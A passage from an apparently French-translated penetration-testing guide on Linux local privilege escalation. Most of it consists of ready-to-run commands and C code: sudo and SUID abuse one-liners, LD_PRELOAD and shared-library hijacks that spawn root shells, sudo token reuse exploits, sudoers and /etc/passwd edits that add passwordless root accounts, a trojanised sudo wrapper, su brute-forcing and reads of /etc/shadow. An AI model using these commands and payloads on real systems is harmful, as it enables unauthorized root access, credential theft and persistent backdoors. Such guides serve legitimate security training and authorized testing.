[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Réseau**

Il est toujours intéressant d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ports ouverts

Vérifiez toujours les services réseau en cours d'exécution sur la machine avec lesquels vous n'avez pas pu interagir avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Vérifiez si vous pouvez renifler le trafic. Si vous le pouvez, vous pourriez être en mesure de récupérer des identifiants.
```
timeout 1 tcpdump
```
## Utilisateurs

### Énumération Générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont dans les systèmes, lesquels peuvent **se connecter** et lesquels ont des **privilèges root :**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Grand UID

Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs avec un **UID > INT\_MAX** d'escalader les privilèges. Plus d'informations: [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitez-le** en utilisant: **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder des privilèges root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mot de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous connecter en tant que chaque utilisateur** en utilisant le mot de passe.

### Brute-force de Su

Si vous ne vous souciez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de forcer l'utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de forcer les utilisateurs.

## Abus de chemin inscriptible

### $PATH

Si vous découvrez que vous pouvez **écrire dans un dossier du $PATH**, vous pourriez être en mesure d'escalader les privilèges en **créant une porte dérobée à l'intérieur du dossier inscriptible** avec le nom d'une commande qui va être exécutée par un utilisateur différent (idéalement root) et qui n'est **pas chargée à partir d'un dossier situé précédemment** à votre dossier inscriptible dans $PATH.

### SUDO et SUID

Vous pourriez être autorisé à exécuter une commande en utilisant sudo ou ils pourraient avoir le bit suid. Vérifiez en utilisant :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certains **commandes inattendues vous permettent de lire et/ou écrire des fichiers ou même d'exécuter une commande.** Par exemple:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration Sudo pourrait permettre à un utilisateur d'exécuter une commande avec les privilèges d'un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root`, il est maintenant trivial d'obtenir un shell en ajoutant une clé ssh dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution de quelque chose :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **piratage de PYTHONPATH** pour charger une bibliothèque python arbitraire lors de l'exécution du script en tant que root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Contournement de l'exécution Sudo en contournant les chemins

**Sautez** pour lire d'autres fichiers ou utilisez des **liens symboliques**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **joker** est utilisé (\*), c'est encore plus facile :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contremesures** : [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande Sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est donnée à une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_, vous pouvez l'exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut également être utilisée si un binaire **suid** exécute une autre commande sans spécifier le chemin d'accès à celle-ci (vérifiez toujours avec **strings** le contenu d'un binaire SUID suspect).

[Exemples de charges utiles à exécuter.](payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le binaire **suid** exécute une autre commande en spécifiant le chemin d'accès, alors vous pouvez essayer d'**exporter une fonction** nommée comme la commande que le fichier suid appelle.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l'exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

La variable d'environnement **LD\_PRELOAD** est utilisée pour spécifier une ou plusieurs bibliothèques partagées (.so files) à charger par le chargeur avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est connu sous le nom de préchargement d'une bibliothèque.

Cependant, pour maintenir la sécurité du système et empêcher cette fonctionnalité d'être exploitée, en particulier avec des exécutables **suid/sgid**, le système impose certaines conditions :

* Le chargeur ignore **LD\_PRELOAD** pour les exécutables où l'identifiant d'utilisateur réel (_ruid_) ne correspond pas à l'identifiant d'utilisateur effectif (_euid_).
* Pour les exécutables avec suid/sgid, seules les bibliothèques dans les chemins standard qui sont également suid/sgid sont préchargées.

Une élévation de privilèges peut se produire si vous avez la capacité d'exécuter des commandes avec `sudo` et que la sortie de `sudo -l` inclut l'instruction **env\_keep+=LD\_PRELOAD**. Cette configuration permet à la variable d'environnement **LD\_PRELOAD** de persister et d'être reconnue même lorsque les commandes sont exécutées avec `sudo`, ce qui peut potentiellement conduire à l'exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrez sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite, **compilez-le** en utilisant :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escaladez les privilèges** en cours d'exécution
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Une élévation de privilèges similaire peut être exploitée si l'attaquant contrôle la variable d'environnement **LD\_LIBRARY\_PATH** car il contrôle le chemin où les bibliothèques vont être recherchées.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binaire SUID - Injection de .so

Lorsque vous rencontrez un binaire avec des permissions **SUID** qui semble inhabituel, il est bon de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/chemin/vers/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Aucun fichier ou dossier de ce type)"_ suggère un potentiel d'exploitation.

Pour exploiter cela, on procéderait en créant un fichier C, disons _"/chemin/vers/.config/libcalc.c"_, contenant le code suivant:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les autorisations de fichier et en exécutant un shell avec des privilèges élevés.

Compilez le fichier C ci-dessus dans un fichier objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l'exécution du binaire SUID affecté devrait déclencher l'exploit, permettant une compromission potentielle du système.

## Détournement d'objet partagé
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID chargeant une bibliothèque à partir d'un dossier où nous pouvons écrire, créons la bibliothèque dans ce dossier avec le nom nécessaire:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Cela signifie que la bibliothèque que vous avez générée doit avoir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste organisée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous ne pouvez **injecter que des arguments** dans une commande.

Le projet recueille les fonctions légitimes des binaires Unix qui peuvent être abusées pour s'échapper des shells restreints, escalader ou maintenir des privilèges élevés, transférer des fichiers, lancer des shells bind et reverse, et faciliter les autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Si vous pouvez accéder à `sudo -l`, vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve comment exploiter une règle sudo quelconque.

### Réutilisation des jetons Sudo

Dans les cas où vous avez un **accès sudo** mais pas le mot de passe, vous pouvez escalader les privilèges en **attendant l'exécution d'une commande sudo puis en détournant le jeton de session**.

Conditions requises pour escalader les privilèges :

* Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
* "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose dans les **15 dernières minutes** (par défaut, c'est la durée du jeton sudo qui nous permet d'utiliser `sudo` sans saisir de mot de passe)
* `cat /proc/sys/kernel/yama/ptrace_scope` est à 0
* `gdb` est accessible (vous pouvez le téléverser)

(Vous pouvez temporairement activer `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou le modifier définitivement dans `/etc/sysctl.d/10-ptrace.conf` en définissant `kernel.yama.ptrace_scope = 0`)

Si toutes ces conditions sont remplies, **vous pouvez escalader les privilèges en utilisant :** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* La **première exploitation** (`exploit.sh`) créera le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le jeton sudo dans votre session** (vous n'obtiendrez pas automatiquement un shell root, faites `sudo su`) :
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **possédé par root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend les **jetons sudo éternels et permet à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nom d'utilisateur>

Si vous avez des **permissions d'écriture** dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) pour **créer un jeton sudo pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant qu'utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin de connaître le mot de passe en faisant :
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers à l'intérieur de `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n'importe quel fichier, vous pourrez **escalader les privilèges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez abuser de cette permission
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre façon d'abuser de ces autorisations :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo` telles que `doas` pour OpenBSD, n'oubliez pas de vérifier sa configuration dans `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si vous savez qu'un **utilisateur se connecte généralement à une machine et utilise `sudo`** pour escalader les privilèges et que vous avez un shell dans ce contexte utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root, puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash\_profile) de sorte que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit exécuté.

Notez que si l'utilisateur utilise un shell différent (pas bash), vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Ou exécutez quelque chose comme:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où viennent les fichiers de configurations chargés**. En général, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **indiquent d'autres dossiers** où les **bibliothèques** seront **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système cherchera des bibliothèques à l'intérieur de `/usr/local/lib`**.

Si pour une raison quelconque **un utilisateur a des permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier à l'intérieur du fichier de configuration de `/etc/ld.so.conf.d/*.conf`, il pourrait être en mesure d'escalader les privilèges.\
Consultez **comment exploiter cette mauvaise configuration** sur la page suivante :

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la librairie dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet endroit tel que spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Les capacités Linux fournissent un **sous-ensemble des privilèges root disponibles à un processus**. Cela divise efficacement les **privilèges root en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette manière, l'ensemble complet des privilèges est réduit, réduisant les risques d'exploitation.\
Consultez la page suivante pour **en savoir plus sur les capacités et comment les abuser**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Autorisations de répertoire

Dans un répertoire, le **bit "exécution"** implique que l'utilisateur concerné peut faire un "**cd**" dans le dossier.\
Le bit **"lecture"** implique que l'utilisateur peut **lister** les **fichiers**, et le bit **"écriture"** implique que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACL

Les listes de contrôle d'accès (ACL) représentent la couche secondaire des autorisations discrétionnaires, capables de **remplacer les autorisations traditionnelles ugo/rwx**. Ces autorisations améliorent le contrôle de l'accès aux fichiers ou répertoires en permettant ou en refusant des droits à des utilisateurs spécifiques qui ne sont pas les propriétaires ou ne font pas partie du groupe. Ce niveau de **granularité garantit une gestion de l'accès plus précise**. Vous trouverez plus de détails [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Accordez** à l'utilisateur "kali" des autorisations de lecture et d'écriture sur un fichier :
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenir** des fichiers avec des ACL spécifiques du système :
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessions de shell ouvertes

Dans les **anciennes versions**, vous pouvez **détourner** une session de **shell** d'un autre utilisateur (**root**).\
Dans les **nouvelles versions**, vous pourrez **vous connecter** uniquement aux sessions de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.

### Détournement de sessions screen

**Lister les sessions screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Attacher à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Détournement de sessions tmux

C'était un problème avec les **anciennes versions de tmux**. Je n'ai pas pu détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Attacher à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Vérifiez **Valentine box from HTB** pour un exemple.

## SSH

### Debian OpenSSL PRNG Prévisible - CVE-2008-0166

Toutes les clés SSL et SSH générées sur les systèmes basés sur Debian (Ubuntu, Kubuntu, etc) entre septembre 2006 et le 13 mai 2008 peuvent être affectées par ce bogue.\
Ce bogue est causé lors de la création d'une nouvelle clé ssh dans ces systèmes d'exploitation, car **seules 32 768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et **en ayant la clé publique ssh, vous pouvez rechercher la clé privée correspondante**. Vous pouvez trouver les possibilités calculées ici : [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valeurs de configuration SSH intéressantes

* **PasswordAuthentication:** Spécifie si l'authentification par mot de passe est autorisée. Par défaut, c'est `no`.
* **PubkeyAuthentication:** Spécifie si l'authentification par clé publique est autorisée. Par défaut, c'est `yes`.
* **PermitEmptyPasswords**: Lorsque l'authentification par mot de passe est autorisée, spécifie si le serveur autorise la connexion aux comptes avec des chaînes de caractères de mot de passe vides. Par défaut, c'est `no`.

### PermitRootLogin

Spécifie si root peut se connecter en utilisant ssh, par défaut c'est `no`. Les valeurs possibles sont :

* `yes`: root peut se connecter en utilisant un mot de passe et une clé privée
* `without-password` ou `prohibit-password`: root peut seulement se connecter avec une clé privée
* `forced-commands-only`: Root peut se connecter uniquement en utilisant une clé privée et si les options de commandes sont spécifiées
* `no` : non

### AuthorizedKeysFile

Spécifie les fichiers contenant les clés publiques pouvant être utilisées pour l'authentification de l'utilisateur. Il peut contenir des jetons comme `%h`, qui seront remplacés par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs à partir du répertoire personnel de l'utilisateur**. Par exemple :
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la clé **privée** de l'utilisateur "**nomutilisateurdetest**", ssh va comparer la clé publique de votre clé avec celles situées dans `/home/nomutilisateurdetest/.ssh/authorized_keys` et `/home/nomutilisateurdetest/access`

### ForwardAgent/AllowAgentForwarding

Le transfert d'agent SSH vous permet d'**utiliser vos clés SSH locales au lieu de laisser des clés** (sans phrases secrètes !) assises sur votre serveur. Ainsi, vous pourrez **sauter** via ssh **vers un hôte** et à partir de là **sauter vers un autre** hôte **en utilisant** la **clé** située dans votre **hôte initial**.

Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci:
```
Host example.com
ForwardAgent yes
```
Notez que si `Host` est `*` chaque fois que l'utilisateur saute sur une machine différente, cette machine pourra accéder aux clés (ce qui est un problème de sécurité).

Le fichier `/etc/ssh_config` peut **outrepasser** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **interdire** la redirection de l'agent ssh avec le mot-clé `AllowAgentForwarding` (par défaut, c'est autorisé).

Si vous constatez que l'Agent Forward est configuré dans un environnement, lisez la page suivante car **vous pourriez l'exploiter pour escalader les privilèges**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Fichiers intéressants

### Fichiers de profils

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts qui s'exécutent lorsque l'utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'entre eux, vous pouvez escalader les privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Fichiers Passwd/Shadow

Selon le système d'exploitation, les fichiers `/etc/passwd` et `/etc/shadow` peuvent avoir un nom différent ou il peut y avoir une sauvegarde. Il est donc recommandé de **trouver tous ces fichiers** et de **vérifier si vous pouvez les lire** pour voir **s'il y a des hachages** à l'intérieur des fichiers :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Dans certaines occasions, vous pouvez trouver des **empreintes de mot de passe** à l'intérieur du fichier `/etc/passwd` (ou équivalent)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd inscriptible

Tout d'abord, générer un mot de passe avec l'une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ensuite, ajoutez l'utilisateur `hacker` et ajoutez le mot de passe généré.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Par exemple : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Alternativement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
AVERTISSEMENT : vous pourriez compromettre la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**REMARQUE :** Sur les plateformes BSD, `/etc/passwd` se trouve à `/etc/pwd.db` et `/etc/master.passwd`, et `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat à l'intérieur de /etc/systemd/**, alors vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre porte dérobée sera exécutée la prochaine fois que tomcat est démarré.

### Vérifier les Dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacement inhabituel/Fichiers possédés
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés dans les dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
